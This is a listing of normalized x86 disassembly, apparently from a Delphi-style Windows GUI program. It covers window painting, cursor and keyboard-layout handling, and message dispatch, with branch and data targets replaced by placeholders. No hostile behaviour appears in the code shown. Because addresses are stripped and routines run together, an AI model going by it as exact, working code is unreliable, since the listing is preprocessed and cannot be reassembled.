xor ecx ecx
push ebp
push sub_3ab5d36
push [ fs : ecx ]
mov [ fs : ecx ] esp
push esi
call CreateCompatibleDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_3ab5cfd
push [ fs : ecx ]
mov [ fs : ecx ] esp
push 0x0
mov eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWindowOrgEx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab5ae8
xor eax eax
mov [ ebx + 0x4 ] eax
push 0xcc0020
mov edx [ ebp - 0x48 ]
push edx
mov eax [ ebp - 0x4c ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x40 ]
sub ecx edx
push ecx
mov ecx [ ebp - 0x44 ]
sub ecx eax
push ecx
push edx
push eax
push esi
call BitBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab5d04
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
retn
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call BeginPaint
mov esi eax
xor eax eax
push ebp
push sub_3ab5c1a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax esi
call sub_3a90f50
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call EndPaint
retn
xor eax eax
push ebp
push sub_3ab5bf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
push 0x4
mov ecx [ ebp - 0x8 ]
mov edx 0x318
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
or edx 0xffffffff
mov eax [ ebp - 0x14 ]
call sub_3a90fdc
retn
lea edx [ ebp - 0x4c ]
mov cl 0xff
mov eax [ ebp - 0x14 ]
call sub_3a91048
sub_3ab5d04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call EndPaint
mov eax [ ebp - 0x8 ]
push eax
call DeleteDC
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_3ab5d44
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab5d64
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab5dd8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab5df8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab5e18
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x8 ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab5e3c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0xc ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab5e60
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab5e84
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x4 ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab5ea4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov ecx ebx
mov eax ebx
call sub_3ab4b0c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab5ed8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_3abdd24
mov edi eax
mov eax edi
call sub_3abde2c
test al al
je r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x1a4 ]
call sub_3a89b74
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3ab7c38
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_3abdf2c
jmp r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_3aac8d8
jmp r-xdata
sub_3ab5f78
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1d9 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x1b4 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x1b4 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
movzx eax [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_3ab1c80
test bl bl
je r-xdata
mov eax edi
call sub_3ab7fe4
mov eax edi
call sub_3ab7b3c
pop edx
pop edi
pop esi
pop ebx
retn
movzx eax [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_3ab7b3c
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_3ab6038
push ebx
push esi
push edi
mov edi edx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_3ab18bc
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_3ab608c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3ab7fe4
mov eax esi
call sub_3ab28e8
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_3ab36e8
test [ esi + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov si 0xffcf
call sub_3a6457c
sub_3ab60e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x1b4 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edi [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
push 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_3aaf6c0
lea edx [ esp + 0x10 ]
xor ecx ecx
mov eax ebx
call sub_3ab4a48
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3aceda8
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3acce1c
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx edi [ eax + 0x7c ]
mov di 0xfffe
jmp r-xdata
movzx edi [ ebx + 0x7c ]
mov di 0xfffe
jmp r-xdata
sub_3ab6240
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_3ab635f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab6366
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
cmp [ esi + 0x1bc ] 0x0
je r-xdata
mov eax esi
call sub_3ab7c38
movzx edx [ esi + 0x1b8 ]
call sub_3abd314
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3accd94
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x1bc ]
test ebx ebx
je r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push edi
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push ebx
mov eax [ esi + 0x1bc ]
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3accb94
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ eax + 0x3c ]
cmp [ esi + 0x1b8 ] 0x0
je r-xdata
push 0x1
push edi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3accb94
mov edx [ esi + 0x1bc ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3accb94
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
sub_3ab6370
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3ab643f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab6446
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
cmp [ ebx + 0x1bc ] 0x0
je r-xdata
cmp [ ebx + 0x1b8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3accd94
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1bc ]
test esi esi
je r-xdata
mov eax ebx
call sub_3ab7c38
mov dl 0x1
call sub_3abd2f8
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
push edi
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push esi
mov eax [ ebx + 0x1bc ]
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_3ab64a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ ebp + 0x8 ]
mov eax edi
call sub_3a78e0c
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_3ab0e78
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1e2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_3ab64f4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_3ab6528
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffd1
call sub_3a6457c
mov eax [ ebp + 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc2
call sub_3a6457c
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0xc
sub_3ab656c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x222 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_3ab0e78
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_3ab65c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_3a83b84
mov edx [ r-xdata ]
call sub_3a64530
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_3ab6600
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x1ac ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_3a7a494
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3ab6624
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x202 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x204 ]
call [ ebx + 0x200 ]
sub_3ab6680
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_3ab65ec
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x1ac ]
call sub_3a7a494
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_3ab66c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x1b0 ]
call sub_3a66ccc
cmp [ ebx + 0x1dc ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1db ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x44 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x240 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_3a66ccc
jmp r-xdata
sub edx 0xffffff88
cmp [ ebx + 0x240 ] 0x0
jne r-xdata
sub_3ab672c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xf7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
mov eax ebx
call sub_3ab45bc
sub_3ab6760
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_3ab6808
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1dc ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab680f
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
mov [ edi + 0x1dc ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_3aad48c
test bl bl
jne r-xdata
cmp [ edi + 0x1ac ] 0x0
jne r-xdata
mov eax [ edi + 0x1ac ]
call sub_3a64380
xor eax eax
mov [ edi + 0x1ac ] eax
lea eax [ edi + 0x1b0 ]
call sub_3a66cb4
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc5
call sub_3a6457c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x1b0 ]
call sub_3a66ccc
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ edi + 0x1ac ] eax
sub_3ab6818
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x4c ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_3ab36c0
xor edx edx
push ebp
push sub_3ab68db
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x40 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_3a6457c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab68e2
mov eax [ ebp - 0x4 ]
call sub_3ab36c8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x60 ]
push edx
mov edx [ ebp - 0x8 ]
movzx ecx [ eax + 0x5c ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_3ab68e2
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac463c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_3aafe18
sub_3ab6930
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_3a64258
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab20d8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_3ab699b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x4c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_3aafe18
sub_3ab69b4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x20a ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x20c ]
call [ ebx + 0x208 ]
sub_3ab69e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov bl 0x1
xor edx edx
mov eax esi
call sub_3ac463c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_3ac44fc
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
movzx ecx [ esp ]
mov eax esi
mov si 0xffba
call sub_3a6457c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x275 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebp
call sub_3ab69e0
test al al
jne r-xdata
mov dl 0x1
mov eax ebp
call sub_3ac463c
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp ebp [ esp + 0x4 ]
je r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + 0x275 ] 0x0
je r-xdata
mov edx edi
mov eax [ esp + 0x4 ]
call sub_3ab69e0
test al al
jne r-xdata
sub_3ab6a88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab69e0
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_3ab8f3c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab6ab4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab69e0
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_3ab8f3c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab6ae0
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x21a ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_3ab6b0c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_3ac463c
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_3ac44fc
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
movzx ecx [ esp ]
mov eax esi
mov si 0xffb9
call sub_3a6457c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x275 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_3ab6b0c
test al al
jne r-xdata
sub_3ab6b74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab6b0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab6b94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab6b0c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab6bd4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_3ac463c
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
movzx eax [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffb8
call sub_3a6457c
movzx eax [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x275 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_3ab6bd4
test al al
jne r-xdata
sub_3ab6c3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab6bd4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab6c5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_3ab0e78
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_3ab6c5c
pop ecx
test al al
